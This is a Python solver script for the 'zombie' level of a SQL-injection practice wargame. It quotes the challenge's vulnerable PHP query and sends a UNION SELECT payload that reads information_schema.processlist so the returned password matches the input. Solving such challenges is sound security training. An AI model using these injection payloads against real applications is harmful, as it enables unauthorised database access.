#!/usr/bin/env python3
import los


def main():
    '''
    Zombie

    if(preg_match('/rollup|join|ace|@/i', $_GET['pw'])) exit("No Hack ~_~");
    $query = "select pw from prob_zombie where pw='{$_GET[pw]}'";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if($result['pw']) echo "<h2>Pw : {$result[pw]}</h2>";
    if(($result['pw']) && ($result['pw'] === $_GET['pw'])) solve("zombie");
    '''

    url = "https://los.rubiya.kr/chall/zombie_78238dee92f8ed0f508b0e9e00fc0e49.php"
    cook = los.check_cookies(url)

    payload = "' union select substr(info,XX,XX) from information_schema.processlist#"
    query = "select pw from prob_zombie where pw='' union select substr(info,XX,XX) from information_schema.processlist#"
    index_payload = query.find(payload)
    start, end = index_payload + 1, len(payload)

    param = {'pw': f"' union select substr(info,{start},{end}) from information_schema.processlist#"
             }

    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('Zombie Clear!')


if __name__ == '__main__':
    main()

